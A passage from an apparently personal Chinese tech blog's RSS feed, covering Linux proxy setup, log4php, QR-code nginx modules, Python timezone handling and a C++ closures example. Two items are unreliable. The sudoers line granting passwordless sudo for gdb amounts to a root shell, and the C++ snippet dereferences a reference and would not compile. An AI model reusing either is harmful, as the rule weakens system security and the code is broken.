</ul>
</div>
</div>

<div id="outline-container-orga37cdc1" class="outline-3">
<h3 id="orga37cdc1">proxychains</h3>
<div class="outline-text-3" id="text-orga37cdc1">
<p>
tsocks 不支持代理访问 https
</p>

<pre class="example">
$ tsocks curl https://www.baidu.com
curl: (7) Failed to connect to www.baidu.com port 443: Connection refused
</pre>

<p>
proxychains 支持代理访问 https
</p>

<pre class="example">
$ proxychains curl https://www.baidu.com
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.11
[proxychains] Dynamic chain  ...  127.0.0.1:7070  ...  www.baidu.com:443  ...  OK
&lt;html&gt;
&lt;head&gt;
    &lt;script&gt;
        location.replace(location.href.replace("https://","http://"));
    &lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;noscript&gt;&lt;meta http-equiv="refresh" content="0;url=http://www.baidu.com/"&gt;&lt;/noscript&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>

<p>
proxychains 的安装配置请参考：<a href="https://sites.google.com/a/pickdreams.org/snail-library/Home/yong-tsocks-heproxychains-dai-lilinux-xia-suo-you-ruan-jian">用tsocks和proxychains代理Linux下所有软件 - 蜗牛图书馆</a>
</p>
</div>

<div id="outline-container-org1646241" class="outline-4">
<h4 id="org1646241">将 socks 代理转换为 http 代理</h4>
<div class="outline-text-4" id="text-org1646241">
<p>
go get 不支持 proxychains（应该是 go 是静态链接的原因），可以使用 <code>privoxy</code>
将 socks 代理转换为 http 代理。
</p>

<p>
安装 <code>privoxy</code>
</p>
<div class="org-src-container">
<pre class="src src-sh">yaourt -S privoxy
</pre>
</div>

<p>
修改 <code>privoxy</code> 配置文件 <code>/etc/privoxy/config</code> ，添加以下配置行
</p>
<pre class="example">
forward-socks5  / 127.0.0.1:7070 .
# local network do not use proxy
forward         192.168.*.*/     .
forward            10.*.*.*/     .
forward           127.*.*.*/     .
</pre>

<p>
启用 <code>privoxy</code> 服务
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo systemctl enable privoxy
sudo systemctl start privoxy
</pre>
</div>

<p>
通过 http 代理使用 <code>go get</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">export</span> <span style="color: #f0c674;">http_proxy</span>=http://127.0.0.1:8118
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">https_proxy</span>=http://127.0.0.1:8118
go get golang.org/x/net
</pre>
</div>

<p>
参考：<a href="http://blog.btthly.com/go-get-socks-proxy-settings.html">go get socks proxy设置 | 爱吃猫粮的鱼</a>
</p>
</div>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux下解决更新grub后无法进入gnome3桌面的问题]]></title>
            <link>/article/archlinux-4e0b89e351b366f465b0-grub-540e65e06cd58fdb5165-gnome3-684c9762768495ee9898.html</link>
            <guid>/article/archlinux-4e0b89e351b366f465b0-grub-540e65e06cd58fdb5165-gnome3-684c9762768495ee9898.html</guid>
            <pubDate>Wed, 26 Jun 2013 02:07:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在启动界面上会看到以下错误日志：
</p>
<pre class="example">
kernel: [    8.398186] [drm:radeon_init] *ERROR* No UMS support in radeon module!
</pre>

<p>
这个是由于grub配置文件中指定了内核参数 <code>nomodeset</code> 导致，linux的默认配置是为了运行服务器，以减少启动过程中出错的可能性，使用gnome3桌面时，需去掉内核参数 <code>nomodeset</code> ，以下为<a href="https://wiki.archlinux.org/index.php/ATI#Disable_KMS">原文</a>：
</p>

<pre class="example">
Note: Adding nomodeset to the kernel boot line might prevent GNOME 3's gnome-shell or KDE's desktop effects from running.
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[《理解Http与Spdy协议》培训课件]]></title>
            <link>/article/300a740689e3-http-4e0e-spdy-534f8bae300b57f98bad8bfe4ef6.html</link>
            <guid>/article/300a740689e3-http-4e0e-spdy-534f8bae300b57f98bad8bfe4ef6.html</guid>
            <pubDate>Thu, 23 May 2013 05:11:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
本课件针对刚入职的毕业生，讲解Http与Spdy协议的基础知识。
</p>

<div id="outline-container-orgf0c63b8" class="outline-2">
<h2 id="orgf0c63b8">开发计划 <code>[1/5]</code></h2>
<div class="outline-text-2" id="text-orgf0c63b8">
<ul class="org-ul">
<li class="on"><code>[X]</code> 编写Http部分大纲</li>
<li class="off"><code>[&#xa0;]</code> 编写Http部分章节内容</li>
<li class="off"><code>[&#xa0;]</code> 编写Spdy部分大纲</li>
<li class="off"><code>[&#xa0;]</code> 编写Spdy部分章节内容</li>
<li class="off"><code>[&#xa0;]</code> 制作Microsoft PowerPoint格式文档</li>
</ul>
</div>
</div>

<div id="outline-container-org1fc96a0" class="outline-2">
<h2 id="org1fc96a0">在线演示</h2>
<div class="outline-text-2" id="text-org1fc96a0">
<p>
<a href="http://blog.kankanan.com/slides/%E7%90%86%E8%A7%A3Http%E4%B8%8ESpdy%E5%8D%8F%E8%AE%AE.html">《理解Http与Spdy协议》</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[log4php初步使用]]></title>
            <link>/article/log4php-521d6b654f7f7528.html</link>
            <guid>/article/log4php-521d6b654f7f7528.html</guid>
            <pubDate>Mon, 06 May 2013 10:32:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgb27daff" class="outline-2">
<h2 id="orgb27daff">简介</h2>
<div class="outline-text-2" id="text-orgb27daff">
<p>
apache出品必属精品。正宗php日志库，与log4j一脉相承。
</p>

<p>
<a href="http://logging.apache.org/log4php/">http://logging.apache.org/log4php/</a>
</p>
</div>
</div>

<div id="outline-container-orgc8679cb" class="outline-2">
<h2 id="orgc8679cb">安装</h2>
<div class="outline-text-2" id="text-orgc8679cb">
<p>
参考：<a href="http://logging.apache.org/log4php/install.html">http://logging.apache.org/log4php/install.html</a>
</p>

<ul class="org-ul">
<li><p>
有root权限，安装到系统目录
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo apt-get install php-pear
sudo pear channel-discover pear.apache.org/log4php
sudo pear install log4php/Apache_log4php
</pre>
</div></li>

<li><p>
没有root权限，安装到当前目录下
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">cd</span> libs
wget http://mirrors.tuna.tsinghua.edu.cn/apache/logging/log4php/2.3.0/apache-log<span style="text-decoration: underline;">4php-2.3.0-src.tar.gz</span>
tar xzvf apache-log4php-2.3.0-src.tar.gz
ln -sf apache-log4php-2.3.0/src/main/php ./log4php
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-org01d8083" class="outline-2">
<h2 id="org01d8083">使用</h2>
<div class="outline-text-2" id="text-org01d8083">
<ul class="org-ul">
<li><p>
进行一下封装定制，可以满足绝大部分情况下的使用
</p>

<ul class="org-ul">
<li>类似nginx的访问日志记录格式</li>
<li>日志中输出文件名及行号</li>
<li>日志文件数据限制为10个，每个日志文件大小为10MB</li>
</ul>

<p>
<a href="../static/logging.inc">logging.inc</a>
</p></li>

<li><p>
使用示例
</p>

<p>
<code>example.php</code>
</p>
<div class="org-src-container">
<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span>
define(<span style="color: #8abeb7;">'LOGGING_APPNAME'</span>, <span style="color: #8abeb7;">'example'</span>);
<span style="color: #b5bd68;">require_once</span>(dirname(<span style="color: #81a2be;">__FILE__</span>) . <span style="color: #8abeb7;">"/logging.inc"</span>);

<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">logger</span> = <span style="color: #81a2be;">Logger</span><span style="color: #c5c8c6; background-color: #1d1f21;">::</span>getLogger(<span style="color: #8abeb7;">"main"</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">logger</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">debug</span>(<span style="color: #8abeb7;">"info log"</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">logger</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">warn</span>(<span style="color: #8abeb7;">"info log"</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">logger</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">error</span>(<span style="color: #8abeb7;">"info log"</span>);
<span style="color: #b294bb;">?&gt;</span>
</pre>
</div></li>

<li><p>
运行结果
</p>

<div class="org-src-container">
<pre class="src src-sh">$ php ./example.php
$ tail -f ./logs/example.log
2013-05-06 18:24:57,925 [DEBUG] main: info log (/home/tangxinfa/php/example.php:<span style="text-decoration: underline;">6)</span>
2013-05-06 18:24:57,930 [WARN] main: info log (/home/tangxinfa/php/example.php:7<span style="text-decoration: underline;">)</span>
2013-05-06 18:24:57,930 [ERROR] main: info log (/home/tangxinfa/php/example.php:<span style="text-decoration: underline;">8)</span>
</pre>
</div></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用o-blog搭建个人博客]]></title>
            <link>/article/4f7f7528-o-blog-642d5efa4e2a4eba535a5ba2.html</link>
            <guid>/article/4f7f7528-o-blog-642d5efa4e2a4eba535a5ba2.html</guid>
            <pubDate>Tue, 09 Apr 2013 04:30:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
新的博客使用<a href="http://renard.github.com/o-blog">o-blog</a>搭建，使用的是自已的分枝<a href="https://github.com/tangxinfa/o-blog">tangxinfa-o-blog</a>，我的分枝主要是对原系统做了一定的简化以便适用于创建个人博客，另修复了一些bug（主要是中文相关），可使用以下配置安装我的分枝：
</p>
<div class="org-src-container">
<pre class="src src-lisp">(setq el-get-sources '((<span style="color: #b294bb;">:name</span> tangxinfa-o-blog
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">:type</span> git<span style="color: #373b41; background-color: #de935f;"> </span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">:url</span> <span style="color: #8abeb7;">"https://github.com/tangxinfa/o-blog.git"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">:load</span> <span style="color: #8abeb7;">"o-blog.el"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">:features</span> o-blog)))
</pre>
</div>
<div class="org-src-container">
<pre class="src src-sh">M-x el-get-install tangxinfa-o-blog
</pre>
</div>

<p>
具体使用可参考本博客的原始org文件：
</p>

<div class="org-src-container">
<pre class="src src-sh">git clone https://github.com/tangxinfa/tangxinfa.github.com.git
</pre>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[如何学习英语]]></title>
            <link>/article/59824f555b664e6082f18bed.html</link>
            <guid>/article/59824f555b664e6082f18bed.html</guid>
            <pubDate>Sun, 07 Apr 2013 01:49:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
经过一天的英孚及韦博试听，总结出以下几点：
</p>
<dl class="org-dl">
<dt>语法</dt><dd>熟读常用句型，扩展至类似语句，从中提炼语法，另一方面也可以练就一口流利的日用口语。</dd>
<dt>听力</dt><dd>不会说就不会听，多说才能够快速识别听到的东西。</dd>
<dt>阅读</dt><dd>多记单词，不断的重复重复再重复，直到看到单词脱口而出。</dd>
</dl>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[在emacs中如何以root权限使用gdb调试程序]]></title>
            <link>/article/5728-emacs-4e2d59824f554ee5-root-674396504f7f7528-gdb-8c038bd57a0b5e8f.html</link>
            <guid>/article/5728-emacs-4e2d59824f554ee5-root-674396504f7f7528-gdb-8c038bd57a0b5e8f.html</guid>
            <pubDate>Sat, 30 Mar 2013 06:21:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>由于M-x命令中使用sudo输入密码无效，需要配置为允许用户sudo gdb免密码</li>
</ul>
<pre class="example">
visudo
# Allow user to sudo gdb without password
用户 ALL=NOPASSWD: /usr/bin/gdb
</pre>

<ul class="org-ul">
<li>使用root权限启动gdb</li>
</ul>
<pre class="example">
M-x gdb
sudo gdb &lt;program&gt; &lt;pid&gt; --annotate=3
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[二维码研究]]></title>
            <link>/article/4e8c7ef4780178147a76.html</link>
            <guid>/article/4e8c7ef4780178147a76.html</guid>
            <pubDate>Sat, 30 Mar 2013 03:21:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgcb4cbae" class="outline-2">
<h2 id="orgcb4cbae">介绍</h2>
<div class="outline-text-2" id="text-orgcb4cbae">
<dl class="org-dl">
<dt><a href="http://www.itsc.org.sg/pdf/synthesis08/Three_QR_Code.pdf">Three_QR_Code.pdf</a></dt><dd>RFC式的文档</dd>

<dt><a href="http://suflow.iteye.com/blog/1100678">二维码 编码原理简介</a></dt><dd>通俗易懂的编码细节介绍</dd>

<dt><a href="http://zh.wikipedia.org/wiki/QR%E7%A2%BC">QR碼 - 维基百科，自由的百科全书</a></dt><dd></dd>


<dt><a href="http://www.qrstuff.com/blog/2011/11/23/qr-code-minimum-size">QR Code Minimum Size</a> 与 <a href="http://www.qrstuff.com/blog/2011/01/18/what-size-should-a-qr-code-be">What Size Should A Printed QR Code Be?</a></dt><dd>关于可识别性的一些结论，该网站上有大量二维码研究相关的文章</dd>
</dl>
</div>
</div>

<div id="outline-container-orgd90870e" class="outline-2">
<h2 id="orgd90870e">二维码开发库</h2>
<div class="outline-text-2" id="text-orgd90870e">
<dl class="org-dl">
<dt><a href="https://github.com/fukuchi/libqrencode">libqrencode</a></dt><dd>基础的c语言二维码编码库，很多语言基于它开发扩展，不包含生成png图的功能，如需生成png可参考<a href="https://github.com/bitly/simplehttp/blob/master/qrencode/qrencode.c">这里</a></dd>
<dt><a href="https://github.com/jeromeetienne/jquery-qrcode">jquery-qrcode</a></dt><dd>使用javascript直接在客户端生成二维码，中文支持参见<a href="http://suflow.iteye.com/blog/1687396">JS生成二维码，支持中文字符</a></dd>
<dt><a href="http://people.freebsd.org/~vanilla/qrencode-0.3.tar.bz2">php's qrencode extension</a></dt><dd>使用nginx的扩展性能会更好一点，参考后面<a href="#orgdb8f81e">nginx的相关扩展</a>.</dd>
<dt><a href="http://trac.koka-in.org/libdecodeqr">libdecodeqr</a></dt><dd>二维码解码库</dd>
</dl>
</div>
</div>

<div id="outline-container-org22f30bf" class="outline-2">
<h2 id="org22f30bf">二维码生成工具</h2>
<div class="outline-text-2" id="text-org22f30bf">
<dl class="org-dl">
<dt><a href="https://launchpad.net/qr-code-creator/">qr-code-creator</a></dt><dd>linux下的GUI程序。</dd>

<dt><a href="https://npmjs.org/package/qrcode-terminal">qrcode-terminal</a></dt><dd>linux终端下生成并展示二维码，是一个node.js模块，带命令行工具程序，方便使用，介绍文章：<a href="http://blog.michaelbrooks.ca/qrcode-terminal/">QR Code Terminal</a></dd>

<dt><a href="https://github.com/lincolnloop/python-qrcode">python-qrcode</a></dt><dd>linux终端下生成并展示二维码，是一个python包，带命令行工具程序，方便使用。</dd>
</dl>
</div>
</div>

<div id="outline-container-orgdb8f81e" class="outline-2">
<h2 id="orgdb8f81e">nginx的相关扩展</h2>
<div class="outline-text-2" id="text-orgdb8f81e">
</div>
<div id="outline-container-org448bac8" class="outline-3">
<h3 id="org448bac8">基本的二维码</h3>
<div class="outline-text-3" id="text-org448bac8">
<p>
<a href="https://github.com/dcshi/ngx_http_qrcode_module">ngx_http_qrcode_module</a>
</p>
</div>
</div>

<div id="outline-container-orge7745f1" class="outline-3">
<h3 id="orge7745f1">二维码个性化水印</h3>
<div class="outline-text-3" id="text-orge7745f1">
<p>
nginx_http_image_filter加上 <a href="http://forum.nginx.org/read.php?21,235958">水印补丁</a> 即可。
</p>

<p>
下面的是经过修改后的 <code>nginx image filter</code> 模块代码，加入居中的水印效果:
</p>

<p>
<a href="../static/ngx_http_image_filter_module.c">ngx_http_image_filter_module.c</a>
</p>
</div>
</div>

<div id="outline-container-org5172180" class="outline-3">
<h3 id="org5172180">编译</h3>
<div class="outline-text-3" id="text-org5172180">
<div class="org-src-container">
<pre class="src src-sh">--with-debug --with-http_image_filter_module --add-module=/home/tangxinfa/Openso<span style="text-decoration: underline;">urce/nginx-1.2.7/../ngx_http_qrcode_module/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../ngx_devel_kit/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../set-misc-nginx-module/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../echo-nginx-module/</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-org37a43c8" class="outline-3">
<h3 id="org37a43c8">配置</h3>
<div class="outline-text-3" id="text-org37a43c8">
<pre class="example">
location ~ /qr {
    qrcode_fg_color FF0000;
    qrcode_bg_color FFFFFF;    
    qrcode_level 2;
    qrcode_hint 2;
    qrcode_size 120;
    qrcode_margin 2;
    qrcode_version 5;
    set_unescape_uri $txt $arg_txt;
    qrcode_txt $txt;
    qrcode_casesensitive 1; 
    qrcode_gen;  

    image_filter_watermark "/usr/share/pixmaps/gnome-word.png";
    image_filter_watermark_transparency 95; #0-100
    image_filter watermark;
}
</pre>
</div>
</div>

<div id="outline-container-org45f1fbc" class="outline-3">
<h3 id="org45f1fbc">访问</h3>
<div class="outline-text-3" id="text-org45f1fbc">
<pre class="example">
http://localhost:8080/qr?txt=hello
</pre>
<ul class="org-ul">
<li>显示效果：</li>
</ul>

<div class="figure">
<p><img src="../static/hello_qr.png" alt="hello_qr.png" />
</p>
</div>
</div>
</div>
</div>

<div id="outline-container-org8ee236c" class="outline-2">
<h2 id="org8ee236c">二维码基础服务的一点思索</h2>
<div class="outline-text-2" id="text-org8ee236c">
<ul class="org-ul">
<li>必须建立在cdn的基础上</li>
<li>用户只需按照约定将内容以及定制参数按照直观的方式编码成二维码图片链接即可</li>
</ul>

<p>
参考：<a href="https://developers.google.com/chart/infographics/docs/qr_codes">https://developers.google.com/chart/infographics/docs/qr_codes</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux下安装cups打印系统]]></title>
            <link>/article/archlinux-4e0b5b8988c5-cups-625353707cfb7edf.html</link>
            <guid>/article/archlinux-4e0b5b8988c5-cups-625353707cfb7edf.html</guid>
            <pubDate>Wed, 27 Mar 2013 13:56:00 GMT</pubDate>
            <content:encoded><![CDATA[<dl class="org-dl">
<dt>安装</dt><dd></dd>
</dl>
<div class="org-src-container">
<pre class="src src-sh">yaourt -S cups-pdf
</pre>
</div>

<dl class="org-dl">
<dt>启动</dt><dd></dd>
</dl>
<div class="org-src-container">
<pre class="src src-sh">sudo systemctl start cups
</pre>
</div>

<dl class="org-dl">
<dt>配置</dt><dd><p>
    参考：<a href="https://wiki.archlinux.org/index.php/Cups#PDF_virtual_printer">https://wiki.archlinux.org/index.php/Cups#PDF_virtual_printer</a>
</p>

<p>
登录的用户名要为root，否则后面还是无法添加打印机，web界面没有退出登录的选项，可以试试重启cups服务浏览器清除缓存的数据。</p></dd>
</dl>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[python中的UTC与本地时区处理]]></title>
            <link>/article/python-4e2d7684-utc-4e0e672c573065f6533a59047406.html</link>
            <guid>/article/python-4e2d7684-utc-4e0e672c573065f6533a59047406.html</guid>
            <pubDate>Wed, 20 Mar 2013 09:29:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在通过sqlalchemy使用sqlite3数据库的过程中，发现日期时间字段默认值为CURRENT_TIMESTAMP，但是查出的值少了8个小时。很明显是遇到时区问题了。
</p>

<p>
mysql的TIMESTAMP字段类型和sqlite3一样使用UTC时间保存，因为在存取时自动进行了本地时间与UTC时间互转，所以不会遇到时区问题。但是sqlite3没有自动进行这一转换，需要在sql中自行转换:
</p>
<div class="org-src-container">
<pre class="src src-sql"><span style="color: #b5bd68;">select</span> datetime(<span style="color: #b294bb;">CURRENT_TIMESTAMP</span>, <span style="color: #8abeb7;">'localtime'</span>)
</pre>
</div>

<p>
进一步google后，找到了这篇文章：《<a href="http://lucumr.pocoo.org/2011/7/15/eppur-si-muove/">Dealing with Timezones in Python</a>》，文章大意是python中的datetime库默认不携带时区信息，而加上时区后又与不带时区的datetime对象无法一起工作（如：比较），另外像datetime.datetime.utcnow()返回的utc时间和datetime.datetime.now()返回的本地时间也是不携带时区信息的（tzinfo属性为None），容易引起混淆，因此处理的简单性，内部最好统一使用UTC标准时间，和用户交互时再转换为本地时间。
</p>

<p>
下面是互转的算法：
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">/usr/bin/env python</span>

<span style="color: #b5bd68;">import</span> datetime
<span style="color: #b5bd68;">import</span> time
<span style="color: #b5bd68;">import</span> sys

<span style="color: #b5bd68;">if</span> sys.version &gt;= <span style="color: #8abeb7;">'3.2.'</span>:
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">localtimezone</span> = datetime.timezone(datetime.timedelta(seconds=-time.timezone)<span style="text-decoration: underline;">, time.tzname[0])</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">utctimezone</span> = datetime.timezone.utc
<span style="color: #b5bd68;">else</span>:
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">from</span> dateutil <span style="color: #b5bd68;">import</span> tz
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">localtimezone</span> = tz.tzlocal()
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">utctimezone</span> = tz.gettz(<span style="color: #8abeb7;">'UTC'</span>)

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">parsedatetime</span>(dt, fmt=<span style="color: #8abeb7;">"%Y-%m-%d %H:%M:%S"</span>):
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">"""parse local datetime string as utc datetime object"""</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> datetime.datetime.strptime(dt, fmt).replace(tzinfo=localtimezone).ast<span style="text-decoration: underline;">imezone(utctimezone)</span>

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">formatdatetime</span>(dt, fmt=<span style="color: #8abeb7;">"%Y-%m-%d %H:%M:%S"</span>):
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">"""format utc datetime object as local datetime string"""</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> dt.replace(tzinfo=utctimezone).astimezone(localtimezone).strftime(fmt<span style="text-decoration: underline;">)</span>

<span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">__name__</span> == <span style="color: #8abeb7;">'__main__'</span>:
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">input_local_datetime</span> = <span style="color: #8abeb7;">'2012-01-02 03:04:05'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">parsed_utc_datetime</span> = parsedatetime(input_local_datetime)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">assert</span>(formatdatetime(parsed_utc_datetime) == input_local_datetime)
</pre>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[C++的函数、闭包与协程]]></title>
            <link>/article/c-768451fd6570300195ed53054e0e534f7a0b.html</link>
            <guid>/article/c-768451fd6570300195ed53054e0e534f7a0b.html</guid>
            <pubDate>Fri, 15 Mar 2013 02:04:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org61ddfe8" class="outline-2">
<h2 id="org61ddfe8">实现序号生成器</h2>
<div class="outline-text-2" id="text-org61ddfe8">
</div>
<div id="outline-container-org4b1e798" class="outline-3">
<h3 id="org4b1e798">函数（Function）</h3>
<div class="outline-text-3" id="text-org4b1e798">
<div class="org-src-container">
<pre class="src src-c++"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;cassert&gt;</span>

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">id_generator</span>(<span style="color: #81a2be;">int</span>&amp; <span style="color: #f0c674;">base</span>, <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">step</span>)
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">result</span> = *base;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> *base += step;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> result;
}

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">odd_base</span> = 1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">even_base</span> = 0;<span style="color: #373b41; background-color: #de935f;">    </span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator(odd_base, 2) == 1);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator(odd_base, 2) == 3);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator(odd_base, 2) == 5);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator(even_base, 2) == 0);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator(even_base, 2) == 2);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator(even_base, 2) == 4);<span style="color: #373b41; background-color: #de935f;">        </span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<dl class="org-dl">
<dt>编译</dt><dd><pre class="example">
g++ -g add.cpp -o add
</pre></dd>
</dl>
</div>
</div>

<div id="outline-container-org458956d" class="outline-3">
<h3 id="org458956d">闭包（Closure）</h3>
<div class="outline-text-3" id="text-org458956d">
<div class="org-src-container">
<pre class="src src-c++"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;cassert&gt;</span>

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">base</span> = 1;
